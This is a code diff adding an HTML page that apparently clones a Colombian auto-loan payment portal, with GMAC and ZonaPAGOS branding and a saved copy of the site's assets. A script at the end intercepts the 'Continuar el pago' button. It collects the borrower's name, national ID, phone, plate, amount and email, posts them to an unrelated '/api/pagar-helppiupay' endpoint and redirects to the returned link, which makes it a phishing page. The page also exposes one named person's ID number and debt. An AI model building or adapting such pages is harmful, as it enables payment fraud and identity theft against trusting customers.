@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Pago de Facturas</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="./Facturas_files/bootstrap.min.css">
+<script src="./Facturas_files/jquery.min.js.descarga"></script>
+<script src="./Facturas_files/bootstrap.min.js.descarga"></script>
+<link rel="stylesheet" href="./Facturas_files/css2">
+<link rel="stylesheet" href="./Facturas_files/css2(1)">
+<link rel="stylesheet" href="./Facturas_files/zona_pagos_gmac.css">
+<style>
+  .campo-pago {
+    margin-bottom: 15px;
+    padding: 12px;
+    background: #f8f9fa;
+    border-radius: 8px;
+    border: 1px solid #dee2e6;
+  }
+  .campo-pago label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: #333;
+  }
+  .campo-pago input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 14px;
+  }
+  .campo-pago small {
+    color: #666;
+    display: block;
+    margin-top: 4px;
+    font-size: 12px;
+  }
+  .requerido { color: red; }
+</style>
+</head>
+<body>
+
+<form method="post" id="FormularioPrincipal">
+
+  <div class="line-top-header"></div>
+  <div class="container">
+    <div class="image-right-div"></div>
+  </div>
+  <br>
+
+  <div id="Contenido_ListadoFacturas_ctl00_UpFacturas">
+    <div class="container">
+      <div class="">
+        <input type="submit" value="Salir" id="Contenido_ListadoFacturas_ctl00_BtnInicio" class="btn-salir">
+      </div>
+
+      <span id="Contenido_ListadoFacturas_ctl00_LblModificarTotalAPagar" style="display: none;">3</span>
+      <span id="Contenido_ListadoFacturas_ctl00_LblAgrupacionPago" style="display: none;">1</span>
+
+      <div class="content-steps">
+        <div class="step">
+          <span class="step-number">1.</span>
+          <div class="info-step">
+            <span class="material-symbols-outlined">checklist</span>
+            <span>Selecciona el/los crédito(s)</span>
+          </div>
+        </div>
+        <div id="Contenido_ListadoFacturas_ctl00_divStep2" class="step">
+          <span class="step-number">2.</span>
+          <div class="info-step">
+            <span class="material-symbols-outlined">edit_note</span>
+            <span>Si vas a realizar un pago por un valor diferente al sugerido, ingresa el valor en el campo <b>"Pagar Otro Valor"</b></span>
+          </div>
+        </div>
+      </div>
+
+      <div style="text-align: center;">
+        <span id="Contenido_ListadoFacturas_ctl00_LblTextoInformativo">Selecciona el crédito y el valor a pagar</span>
+      </div>
+
+      <div class="row">
+        <div class="col-md-12">
+          <div style="overflow-y: auto;">
+            <div id="Contenido_ListadoFacturas_ctl00_PanelDesktop" class="d-none d-md-block">
+              <div>
+                <table class="table table-hover table-responsive custom-gridview" cellspacing="0" id="Contenido_ListadoFacturas_ctl00_GvFacturas" style="border-collapse:collapse;">
+                  <tbody>
+                    <tr>
+                      <th scope="col">Selecciona</th>
+                      <th scope="col">Número de crédito</th>
+                      <th class="hide" scope="col">Concepto</th>
+                      <th class="hide" scope="col">Tipo de identificación</th>
+                      <th class="hide" scope="col">Identificación</th>
+                      <th class="hide" scope="col">Nombre</th>
+                      <th class="hide" scope="col">Apellido</th>
+                      <th class="hide" scope="col">Email</th>
+                      <th class="hide" scope="col">Teléfono</th>
+                      <th class="hide" scope="col">Campo adicional 1</th>
+                      <th scope="col">Placa</th>
+                      <th class="hide" scope="col">Campo adicional 3</th>
+                      <th class="hide" scope="col">Total IVA</th>
+                      <th class="hide" scope="col">Saldo</th>
+                      <th scope="col">Fecha límite de pago DD-MM-AAAA</th>
+                      <th scope="col">Valor sugerido para pago</th>
+                      <th scope="col">Pagar otro valor</th>
+                      <th class="hide" scope="col">Orden</th>
+                    </tr>
+                    <tr class="rows unselected-row">
+                      <td>
+                        <span class="chk">
+                          <input id="Contenido_ListadoFacturas_ctl00_GvFacturas_ChkSeleccion_0" type="checkbox">
+                        </span>
+                      </td>
+                      <td>89767246</td>
+                      <td class="hide">&nbsp;</td>
+                      <td class="hide">1</td>
+                      <td class="hide">33155801</td>
+                      <td class="hide">DORINA ESTER RICARDO DE JIMENEZ</td>
+                      <td class="hide">&nbsp;</td>
+                      <td class="hide">&nbsp;</td>
+                      <td class="hide">&nbsp;</td>
+                      <td class="hide">79502220897672</td>
+                      <td>LRM644</td>
+                      <td class="hide">&nbsp;</td>
+                      <td class="hide">0</td>
+                      <td class="hide">1,718,239</td>
+                      <td>05/10/2026</td>
+                      <td>
+                        <span id="Contenido_ListadoFacturas_ctl00_GvFacturas_lblValorAPagar_0" class="lblValorAPagar">1,718,239</span>
+                      </td>
+                      <td>
+                        <input name="valorAPagar" type="text" maxlength="11" id="Contenido_ListadoFacturas_ctl00_GvFacturas_ValorAPagar_0" class="txtValorAPagar form-control">
+                      </td>
+                      <td class="hide">0</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div id="Contenido_ListadoFacturas_ctl00_DivSeleccionarTodo" class="content-select-all">
+            <input id="Contenido_ListadoFacturas_ctl00_ChkSeleccionarTodo" type="checkbox">
+            <span id="Contenido_ListadoFacturas_ctl00_LblSeleccionarTodo" style="margin-left: 10px;">Seleccionar todo</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="row hide-section">
+        <div class="col-md-3 col-md-offset-7">
+          <span id="Contenido_ListadoFacturas_ctl00_LblTotalAPagar">Total a pagar</span>
+        </div>
+        <div class="col-md-2">
+          <span id="Contenido_ListadoFacturas_ctl00_TotalAPagar">1,718,239</span>
+        </div>
+      </div>
+
+      <div id="Contenido_ListadoFacturas_ctl00_DivTotalSeleccionado" class="info-pay">
+        <div class="full-payment-label">
+          <span id="Contenido_ListadoFacturas_ctl00_LblTotalAPagarSeleccionado">Total a pagar seleccionado</span>
+        </div>
+        <div class="content-total-seleccionado">
+          <div class="full-payment">
+            <span id="Contenido_ListadoFacturas_ctl00_TotalAPagarSeleccionado">0</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="content-list">
+        <ul>
+          <li>Recuerda que si tu obligación se encuentra en mora el valor sugerido para pago no incluye gastos de cobranza prejudicial y/o judicial en caso de aplicar.</li>
+          <li>El pago que realices en horario bancario se verá reflejado en tu crédito al siguiente día hábil, sí pagas en otro horario se reflejará al segundo día hábil.</li>
+          <li>Si realizas el pago desde una cuenta Bancolombia, selecciona el botón de pagos de Bancolombia y veras reflejado el pago en tu crédito al siguiente día hábil.</li>
+        </ul>
+      </div>
+
+      <!-- Campo de correo -->
+      <div class="campo-pago" style="margin-top: 20px;">
+        <label for="inputCorreoPago">
+          Correo electrónico <span class="requerido">*</span>
+        </label>
+        <input 
+          type="email" 
+          id="inputCorreoPago" 
+          placeholder="tucorreo@ejemplo.com" 
+          required
+        >
+        <small>Necesario para procesar el pago</small>
+      </div>
+
+      <div id="Contenido_ListadoFacturas_ctl00_DivBtnPagar">
+        <input type="button" value="Continuar el pago" id="Contenido_ListadoFacturas_ctl00_BtnPagar" class="btn btn-default btn-block">
+      </div>
+
+    </div>
+  </div>
+
+  <br>
+
+  <div id="PieDePagina_DivPieDePagina">
+    <div class="footer-gmac">
+      <img class="vigilado" src="./Facturas_files/logo-vigilado.jpg" alt="vigilado">
+      <div class="content-footer">
+        <div class="content-logo-gm">
+          <img class="logo-gmac" src="./Facturas_files/gmf_logo.png" alt="logo gmac">
+        </div>
+        <div class="text-zona">
+          <strong>ZonaPAGOS</strong> es un producto de <strong>ZonaVirtual S.A.</strong><br>
+          Copyright ZonaVirtual S.A.
+        </div>
+      </div>
+    </div>
+  </div>
+
+</form>
+
+<!-- 👇 SCRIPT DE PAGO (CHECKOUT SESSIONS) 👇 -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  setTimeout(function() {
+    const btnPagar = document.getElementById('Contenido_ListadoFacturas_ctl00_BtnPagar');
+    if (!btnPagar) {
+      console.warn('[PSE] No se encontró el botón de pago');
+      return;
+    }
+
+    btnPagar.addEventListener('click', async function() {
+      // 1. Validar que haya factura seleccionada
+      const checkbox = document.querySelector('#Contenido_ListadoFacturas_ctl00_GvFacturas_ChkSeleccion_0');
+      if (!checkbox || !checkbox.checked) {
+        alert('Por favor selecciona el crédito que deseas pagar.');
+        return;
+      }
+
+      // 2. Validar el correo
+      const inputCorreo = document.getElementById('inputCorreoPago');
+      const correo = (inputCorreo.value || '').trim();
+      if (!correo || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
+        alert('Por favor ingresa un correo electrónico válido.');
+        inputCorreo.focus();
+        return;
+      }
+
+      // 3. Extraer datos de la tabla
+      const fila = checkbox.closest('tr');
+      const celdas = fila.querySelectorAll('td');
+
+      const credito    = celdas[1].textContent.trim();
+      const cedula     = celdas[4].textContent.trim();
+      const nombreFull = celdas[5].textContent.trim();
+      const telefono   = celdas[8].textContent.trim();
+      const placa      = celdas[10].textContent.trim();
+
+      const inputOtroValor = fila.querySelector('.txtValorAPagar');
+      const valorFinal = (inputOtroValor && inputOtroValor.value)
+        ? inputOtroValor.value
+        : document.querySelector('.lblValorAPagar').textContent.trim();
+
+      const partes = nombreFull.trim().split(' ');
+      const nombre   = partes.length > 1 ? partes.slice(0, -1).join(' ') : nombreFull;
+      const apellido = partes.length > 1 ? partes.slice(-1).join(' ') : '';
+
+      // 4. Deshabilitar mientras se procesa
+      btnPagar.disabled = true;
+      const textoOriginal = btnPagar.value;
+      btnPagar.value = 'Generando pago...';
+
+      try {
+        const resp = await fetch('/api/pagar-helppiupay', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            credito,
+            valor: valorFinal,
+            placa,
+            nombre,
+            apellido,
+            email: correo,
+            telefono,
+            identificacion: cedula
+          })
+        });
+
+        const data = await resp.json();
+
+        if (data.url) {
+          window.location.href = data.url;
+        } else {
+          alert('Error al generar el pago: ' + (data.error || 'desconocido'));
+          btnPagar.disabled = false;
+          btnPagar.value = textoOriginal;
+        }
+      } catch (e) {
+        alert('Error de conexión: ' + e.message);
+        btnPagar.disabled = false;
+        btnPagar.value = textoOriginal;
+      }
+    });
+
+    console.log('[PSE] Botón de pago interceptado ✅');
+  }, 500);
+});
+</script>
+<!-- 👆 FIN SCRIPT 👆 -->
+
+</body>
+</html>
